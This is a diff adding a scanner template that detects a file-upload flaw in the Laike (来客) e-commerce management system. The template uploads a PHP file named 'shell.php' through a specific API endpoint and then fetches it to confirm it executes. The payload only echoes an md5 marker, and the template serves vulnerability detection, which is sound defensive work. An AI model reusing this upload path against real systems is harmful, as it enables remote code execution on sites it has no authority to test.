@@ -1,0 +1,57 @@
+id: poc-yaml-Laike-E-commerce-file-upload
+info:
+  name: 来客电商管理系统文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    This template detects a file upload vulnerability in 来客电商管理系统. It checks for the ability to upload a PHP file and execute it.
+
+variables:
+  boundary: '{{rand_text_alphanumeric(10)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-check
+    method: POST
+    path:
+      - '{{BaseURL}}/LKT/index.php?module=api&action=product&m=t_comment'
+    headers:
+      Content-Type: 'multipart/form-data; boundary={{boundary}}'
+    body: |
+      --{{boundary}}
+      Content-Disposition: form-data; name="imgFile"; filename="shell.php"
+      Content-Type: image/php
+
+      <?php echo md5('{{boundary}}'); ?>
+      --{{boundary}}
+      Content-Disposition: form-data; name="type";
+
+      file
+      --{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"status":1,"err":'
+          - 'insert into lkt_comments_img'
+          - 'VALUES'
+        part: body
+    extractors:
+      - type: regex
+        group: 1
+        internal: true
+        regex:
+          - '(?P<fname>[0-9^.]+).php'
+
+  - id: file-verification
+    method: GET
+    path:
+      - '{{BaseURL}}/LKT/images/{{fname}}.php'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, md5(boundary))"
